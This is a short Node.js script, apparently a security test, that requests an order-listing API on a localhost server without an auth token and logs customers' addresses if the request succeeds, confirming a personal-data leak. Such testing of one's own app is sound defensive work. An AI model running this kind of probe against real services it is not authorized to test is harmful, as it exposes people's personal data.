const axios = require('axios');

const LIST_ORDERS_URL = 'http://localhost:4000/api/order/list';

async function testPIILeak() {
  console.log(`[PII Leak] Attempting to list all orders without auth token at ${LIST_ORDERS_URL}...`);

  try {
    const res = await axios.get(LIST_ORDERS_URL);

    console.log(`[PII Leak] Response Status:`, res.status);

    if (res.data.success) {
      console.log("⚠️  VULNERABILITY CONFIRMED: PII Leak. Unauthenticated user can list all orders.");
      if (res.data.orders && res.data.orders.length > 0) {
        console.log(`[PII Leak] Found ${res.data.orders.length} orders.`);
        const firstOrder = res.data.orders[0];
        if (firstOrder.address) {
           console.log(`[PII Leak] Sample Data exposed:`, JSON.stringify(firstOrder.address, null, 2));
        }
      } else {
        console.log("[PII Leak] No orders found in DB, but access was granted.");
      }
    } else {
      console.log("✅ Request failed (maybe protected?).");
    }

  } catch (err) {
    console.log(`[PII Leak] Error:`, err.message);
    if (err.response) {
       console.log(`[PII Leak] Response Data:`, err.response.data);
    }
  }
}

testPIILeak();
